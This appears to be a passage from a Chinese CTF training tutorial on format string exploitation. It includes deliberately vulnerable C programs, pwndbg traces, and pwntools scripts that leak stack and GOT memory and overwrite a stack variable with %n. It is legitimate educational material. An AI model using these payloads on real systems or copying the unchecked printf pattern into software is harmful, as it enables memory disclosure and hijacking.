## 泄露内存

#### 泄露栈内存
Example：
```c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);  
  return 0;
}
```

```bash
gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
```

##### 获取栈变量数值

```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [16:40:35]
$ ./a.out
%08x.%08x.%08x
00000001.22222222.ffffffff.%08x.%08x.%08x
bbb656b0.00000000.00000001%   
```
用gdb观察验证，我使用 `%p` 来获取数据

```bash
pwndbg> r
Starting program: /home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/a.out
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
%p.%p.%p
──────────────────────────────────────────────────────────
pwndbg> c
Continuing.
00000001.22222222.ffffffff.%p.%p.%p
──────────────────────────────────────────────────────────
pwndbg> c
Continuing.
0x5555555596b0.(nil).0x1[Inferior 1 (process 11717) exited normally]
```

> Tips：这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。

**如何直接获取栈中被视为第 n+1 个参数的值？**
```bash
%n$x
```
利用如上的字符串，我们就可以获取到对应的第 `n+1` 个参数的数值。为什么这里要说是对应第 `n+1` 个参数呢？这是因为格式化参数里面的 `n` 指的是该格式化字符串对应的第 `n` 个输出参数，那相对于输出函数来说，就是第 `n+1` 个参数了。

```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [18:57:11]
$ ./leakmemory
%3$x
00000001.22222222.ffffffff.%3$x
804919d%  
```
再次gdb调试：

```bash
──────────────────────────────────────────────────────────
pwndbg> c
Continuing.
804919d[Inferior 1 (process 22537) exited normally]
```

#### 获取栈变量对应字符串
用 `%s` 来获得栈变量对应的字符串
```bash
pwndbg> b printf
Breakpoint 1 at 0x8049050
pwndbg> r
Starting program: /home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory
%s

Breakpoint 1, 0xf7dd7a90 in printf () from /lib/i386-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────
 EAX  0x804a00b ◂— '%08x.%08x.%08x.%s\n'
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7f24380 ◂— 0x20002
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd024 —▸ 0xffffd19c ◂— '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory'
 EBP  0xffffcf58 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcebc —▸ 0x80491ea (main+100) ◂— add esp, 0x20
 EIP  0xf7dd7a90 (printf) ◂— endbr32
──────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────
 ► 0xf7dd7a90 <printf>       endbr32
   0xf7dd7a94 <printf+4>     call   0xf7ef1e41                  <0xf7ef1e41>

   0xf7dd7a99 <printf+9>     add    eax, 0x1d2567
   0xf7dd7a9e <printf+14>    sub    esp, 0xc
   0xf7dd7aa1 <printf+17>    lea    edx, [esp + 0x14]
   0xf7dd7aa5 <printf+21>    push   0
   0xf7dd7aa7 <printf+23>    push   edx
   0xf7dd7aa8 <printf+24>    push   dword ptr [esp + 0x18]
   0xf7dd7aac <printf+28>    mov    eax, dword ptr [eax - 0x11c]
   0xf7dd7ab2 <printf+34>    push   dword ptr [eax]
   0xf7dd7ab4 <printf+36>    call   0xf7de85c0                  <0xf7de85c0>
───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp 0xffffcebc —▸ 0x80491ea (main+100) ◂— add esp, 0x20
01:0004│-098 0xffffcec0 —▸ 0x804a00b ◂— '%08x.%08x.%08x.%s\n'
02:0008│-094 0xffffcec4 ◂— 1
03:000c│-090 0xffffcec8 ◂— 0x22222222 ('""""')
04:0010│-08c 0xffffcecc ◂— 0xffffffff
05:0014│-088 0xffffced0 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
06:0018│-084 0xffffced4 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
07:001c│-080 0xffffced8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— 'GLIBC_2.34'
─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► 0 0xf7dd7a90 printf
   1 0x80491ea main+100
   2 0xf7da1519 None
   3 0xf7da15f3 __libc_start_main+147
   4 0x804909c _start+44
───────────────────────────────────────────────────────────────────────────────────────────────
00000001.22222222.ffffffff.%s

Breakpoint 1, 0xf7dd7a90 in printf () from /lib/i386-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────
*EAX  0xffffcee0 ◂— 0x7325 /* '%s' */
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
*ECX  0
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd024 —▸ 0xffffd19c ◂— '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory'
 EBP  0xffffcf58 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
*ESP  0xffffcecc —▸ 0x80491f9 (main+115) ◂— add esp, 0x10
 EIP  0xf7dd7a90 (printf) ◂— endbr32
──────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────
 ► 0xf7dd7a90 <printf>       endbr32
   0xf7dd7a94 <printf+4>     call   0xf7ef1e41                  <0xf7ef1e41>

   0xf7dd7a99 <printf+9>     add    eax, 0x1d2567
   0xf7dd7a9e <printf+14>    sub    esp, 0xc
   0xf7dd7aa1 <printf+17>    lea    edx, [esp + 0x14]
   0xf7dd7aa5 <printf+21>    push   0
   0xf7dd7aa7 <printf+23>    push   edx
   0xf7dd7aa8 <printf+24>    push   dword ptr [esp + 0x18]
   0xf7dd7aac <printf+28>    mov    eax, dword ptr [eax - 0x11c]
   0xf7dd7ab2 <printf+34>    push   dword ptr [eax]
   0xf7dd7ab4 <printf+36>    call   0xf7de85c0                  <0xf7de85c0>
───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp 0xffffcecc —▸ 0x80491f9 (main+115) ◂— add esp, 0x10
01:0004│-088 0xffffced0 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
02:0008│-084 0xffffced4 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
03:000c│-080 0xffffced8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— 'GLIBC_2.34'
04:0010│-07c 0xffffcedc —▸ 0x804919d (main+23) ◂— add ebx, 0x2e63
05:0014│ eax 0xffffcee0 ◂— 0x7325 /* '%s' */
06:0018│-074 0xffffcee4 ◂— 1
07:001c│-070 0xffffcee8 —▸ 0xf7ffda40 ◂— 0
─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► 0 0xf7dd7a90 printf
   1 0x80491f9 main+115
   2 0xf7da1519 None
   3 0xf7da15f3 __libc_start_main+147
   4 0x804909c _start+44
───────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
%s[Inferior 1 (process 23028) exited normally]
```
看到这里：
```bash
01:0004│-088 0xffffced0 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
```
可以看出，在第二次执行 printf 函数的时候，确实是将 0xffffcd04 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串

**当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃**

此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 1001 个参数，如下，此时程序就不能够解析，就崩溃了。
```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [19:03:30]
$ ./leakmemory
%1000$s
00000001.22222222.ffffffff.%1000$s
[1]    23710 segmentation fault (core dumped)  ./leakmemory
```
**总结：**

> 1. 利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别
> 2. 利用 %s 来获取变量所对应地址的内容，只不过有零截断
> 3. 利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容


#### 泄露任意地址内存
在上面的内容中，我们实现了泄露栈上连续的变量以及泄露指定的变量值，那我们是否能尝试，泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦~

我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例
```bash
───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp 0xffffcecc —▸ 0x80491f9 (main+115) ◂— add esp, 0x10
01:0004│-088 0xffffced0 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
02:0008│-084 0xffffced4 —▸ 0xffffcee0 ◂— 0x7325 /* '%s' */
03:000c│-080 0xffffced8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— 'GLIBC_2.34'
04:0010│-07c 0xffffcedc —▸ 0x804919d (main+23) ◂— add ebx, 0x2e63
05:0014│ eax 0xffffcee0 ◂— 0x7325 /* '%s' */
06:0018│-074 0xffffcee4 ◂— 1
07:001c│-070 0xffffcee8 —▸ 0xf7ffda40 ◂— 0
```
可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffced0，同时该地址存储的也确实是 "%s" 格式化字符串内容

那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容

```bash
addr%k$s
```
> 注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。

下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定
```bash
[tag]%p%p%p%p%p%p...
```
我们可以使用'A'来作为[tag]，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址（之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值，一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认）

如：
```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [19:23:13]
$ ./leakmemory
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xfff946900xf7f3d7b00x804919d0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250xf70070250x20(nil)0xfff94854%                    
```
由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下：
```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [19:23:24]
$ ./leakmemory
%4$s
00000001.22222222.ffffffff.%4$s
[1]    27904 segmentation fault (core dumped)  ./leakmemory
```
可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试：
```bash
pwndbg> b printf
Breakpoint 1 at 0x8049050
pwndbg> r
Starting program: /home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory
%4$s

Breakpoint 1, 0xf7dd7a90 in printf () from /lib/i386-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────
 EAX  0x804a00b ◂— '%08x.%08x.%08x.%s\n'
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7f24380 ◂— 0x20002
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd024 —▸ 0xffffd19c ◂— '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory'
 EBP  0xffffcf58 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcebc —▸ 0x80491ea (main+100) ◂— add esp, 0x20
 EIP  0xf7dd7a90 (printf) ◂— endbr32
──────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────
 ► 0xf7dd7a90 <printf>       endbr32
   0xf7dd7a94 <printf+4>     call   0xf7ef1e41                  <0xf7ef1e41>

   0xf7dd7a99 <printf+9>     add    eax, 0x1d2567
   0xf7dd7a9e <printf+14>    sub    esp, 0xc
   0xf7dd7aa1 <printf+17>    lea    edx, [esp + 0x14]
   0xf7dd7aa5 <printf+21>    push   0
   0xf7dd7aa7 <printf+23>    push   edx
   0xf7dd7aa8 <printf+24>    push   dword ptr [esp + 0x18]
   0xf7dd7aac <printf+28>    mov    eax, dword ptr [eax - 0x11c]
   0xf7dd7ab2 <printf+34>    push   dword ptr [eax]
   0xf7dd7ab4 <printf+36>    call   0xf7de85c0                  <0xf7de85c0>
───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp 0xffffcebc —▸ 0x80491ea (main+100) ◂— add esp, 0x20
01:0004│-098 0xffffcec0 —▸ 0x804a00b ◂— '%08x.%08x.%08x.%s\n'
02:0008│-094 0xffffcec4 ◂— 1
03:000c│-090 0xffffcec8 ◂— 0x22222222 ('""""')
04:0010│-08c 0xffffcecc ◂— 0xffffffff
05:0014│-088 0xffffced0 —▸ 0xffffcee0 ◂— '%4$s'
06:0018│-084 0xffffced4 —▸ 0xffffcee0 ◂— '%4$s'
07:001c│-080 0xffffced8 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— 'GLIBC_2.34'
─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► 0 0xf7dd7a90 printf
   1 0x80491ea main+100
   2 0xf7da1519 None
   3 0xf7da15f3 __libc_start_main+147
   4 0x804909c _start+44
───────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/x 0xffffced0
0xffffced0:     0xffffcee0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 0x8048000  0x8049000 r--p     1000       0 leakmemory
 0x8049000  0x804a000 r-xp     1000    1000 leakmemory
 0x804a000  0x804b000 r--p     1000    2000 leakmemory
 0x804b000  0x804c000 r--p     1000    2000 leakmemory
 0x804c000  0x804d000 rw-p     1000    3000 leakmemory
 0x804d000  0x806f000 rw-p    22000       0 [heap]
0xf7d80000 0xf7da0000 r--p    20000       0 /usr/lib/i386-linux-gnu/libc.so.6
0xf7da0000 0xf7f22000 r-xp   182000   20000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7f22000 0xf7fa7000 r--p    85000  1a2000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fa7000 0xf7fa8000 ---p     1000  227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fa8000 0xf7faa000 r--p     2000  227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7faa000 0xf7fab000 rw-p     1000  229000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7fab000 0xf7fb5000 rw-p     a000       0 [anon_f7fab]
0xf7fbe000 0xf7fc0000 rw-p     2000       0 [anon_f7fbe]
0xf7fc0000 0xf7fc4000 r--p     4000       0 [vvar]
0xf7fc4000 0xf7fc6000 r-xp     2000       0 [vdso]
0xf7fc6000 0xf7fc7000 r--p     1000       0 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fc7000 0xf7fec000 r-xp    25000    1000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fec000 0xf7ffb000 r--p     f000   26000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffb000 0xf7ffd000 r--p     2000   34000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffd000 0xf7ffe000 rw-p     1000   36000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xfffdd000 0xffffe000 rw-p    21000       0 [stack]
pwndbg> x/x 0xffffcee0
0xffffcee0:     0x73243425
pwndbg> x/x 0x73243425
0x73243425:     Cannot access memory at address 0x73243425
```

显然 0xffffcee0 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了

如果我们换成一个可访问的地址，例如 scanf@got ，这样就能够输出 scanf 对应的地址了。我们不妨来试一下：

首先，获取 scanf@got 的地址，如下：
```bash
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory:
GOT protection: Partial RELRO | Found 3 GOT entries passing the filter
[0x804c00c] __libc_start_main@GLIBC_2.34 -> 0xf7da1560 (__libc_start_main) ◂— endbr32
[0x804c010] printf@GLIBC_2.0 -> 0xf7dd7a90 (printf) ◂— endbr32
[0x804c014] __isoc99_scanf@GLIBC_2.7 -> 0xf7dd8c60 (__isoc99_scanf) ◂— endbr32
```

构造的payload如下：
```python
from pwn import *

# context.arch = 'i386'
# context.log_level = 'debug'

sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')

__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print(f"__isoc99_scanf GOT address: {hex(__isoc99_scanf_got)}")

payload = p32(__isoc99_scanf_got) + b'%4$s'
print(f"Payload: {payload}")

sh.sendline(payload)

sh.recvuntil(b'%4$s\n')
received = sh.recv()
scanf_addr = u32(received[4:8])
print(f"Actual __isoc99_scanf address: {hex(scanf_addr)}")

sh.interactive()
```
运行后我们得到了 scanf 的地址：
```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [19:32:36] 
$ python3 exp1.py
[+] Starting local process './leakmemory': pid 32466
[*] '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/leakmemory'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
__isoc99_scanf GOT address: 0x804c014
Payload: b'\x14\xc0\x04\x08%4$s'
[*] Process './leakmemory' stopped with exit code 0 (pid 32466)
Actual __isoc99_scanf address: 0xf7d66c60
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子：
```bash
[padding][addr]
```

注意：
> 我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 \,x,0,c 分别作为一个字符进行读入

## 覆盖内存

上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型
```bash
%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
```
通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量

这里我们给出如下的程序来介绍相应的部分：
```c
/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```

```bash
gcc -fno-stack-protector -m32 -o overflow overflow.c
```

无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload

```bash
...[overwrite addr]....%[overwrite offset]$n
```
其中... 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤：
1. 确定覆盖地址
2. 确定相对偏移
3. 进行覆盖

#### 覆盖栈内存
##### 确定覆盖地址
首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址
##### 确定相对偏移
其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试：
```bash
pwndbg> b printf
Breakpoint 1 at 0x1050
pwndbg> r
Starting program: /home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/overflow
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0xf7dd7a90 in printf () from /lib/i386-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 EAX  0x56557008 ◂— 0xa7025 /* '%p\n' */
 EBX  0x56558fd0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed8
 ECX  0xffffcfb0 ◂— 1
 EDX  0xffffcfd0 —▸ 0xf7faa000 ◂— 0x229dac
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd064 —▸ 0xffffd1d4 ◂— '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/overflow'
 EBP  0xffffcf98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— 0x464c457f
 ESP  0xffffcf0c —▸ 0x565561f4 (main+55) ◂— add esp, 0x10
 EIP  0xf7dd7a90 (printf) ◂— endbr32
──────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────
 ► 0xf7dd7a90 <printf>       endbr32
   0xf7dd7a94 <printf+4>     call   0xf7ef1e41                  <0xf7ef1e41>

   0xf7dd7a99 <printf+9>     add    eax, 0x1d2567
   0xf7dd7a9e <printf+14>    sub    esp, 0xc
   0xf7dd7aa1 <printf+17>    lea    edx, [esp + 0x14]
   0xf7dd7aa5 <printf+21>    push   0
   0xf7dd7aa7 <printf+23>    push   edx
   0xf7dd7aa8 <printf+24>    push   dword ptr [esp + 0x18]
   0xf7dd7aac <printf+28>    mov    eax, dword ptr [eax - 0x11c]
   0xf7dd7ab2 <printf+34>    push   dword ptr [eax]
   0xf7dd7ab4 <printf+36>    call   0xf7de85c0                  <0xf7de85c0>
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffcf0c —▸ 0x565561f4 (main+55) ◂— add esp, 0x10
01:0004│-088 0xffffcf10 —▸ 0x56557008 ◂— 0xa7025 /* '%p\n' */
02:0008│-084 0xffffcf14 —▸ 0xffffcf8c ◂— 0x315
03:000c│-080 0xffffcf18 ◂— 0
04:0010│-07c 0xffffcf1c —▸ 0x565561d4 (main+23) ◂— add ebx, 0x2dfc
05:0014│-078 0xffffcf20 ◂— 0
```
其中：
```bash
02:0008│-084 0xffffcf14 —▸ 0xffffcf8c ◂— 0x315
```

我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串'%d%d'的地址：
```bash
pwndbg> c
Continuing.
0xffffcf8c
%d%d

Breakpoint 1, 0xf7dd7a90 in printf () from /lib/i386-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
*EAX  0xffffcf28 ◂— '%d%d'
 EBX  0x56558fd0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed8
*ECX  0xf7f24380 ◂— 0x20002
*EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffd064 —▸ 0xffffd1d4 ◂— '/home/zer0ptr/CTF-Training/Pwn/fmtstr/leakmemory/overflow'
 EBP  0xffffcf98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— 0x464c457f
 ESP  0xffffcf0c —▸ 0x56556219 (main+92) ◂— add esp, 0x10
 EIP  0xf7dd7a90 (printf) ◂— endbr32
```
其中格式化字符串'%d%d'的地址是 0xffffcd28 且相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数

##### 进行覆盖
这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下：
```bash
[addr of c]%012d%6$n
```

addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16
```python
from pwn import *

def forc():
    sh = process('./overflow')
    c_addr_line = sh.recvuntil(b'\n', drop=True)
    c_addr = int(c_addr_line, 16)
    print(hex(c_addr))
    payload = p32(c_addr) + b'%012d' + b'%6$n'
    print(payload)
    # gdb.attach(sh)
    sh.sendline(payload)
    print(sh.recv().decode('utf-8', errors='ignore'))
    sh.interactive()
forc()
```
结果如下：
```bash
# zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/leakmemory on git:master x [13:05:56] C:1
$ python3 overflow.py
[+] Starting local process './overflow': pid 6562
0xffa4444c
b'LD\xa4\xff%012d%6$n'
LD-00006011928modified c.

[*] Switching to interactive mode
[*] Process './overflow' stopped with exit code 0 (pid 6562)
[*] Got EOF while reading in interactive
$
```

#### 覆盖任意地址内存
##### 覆盖小数字
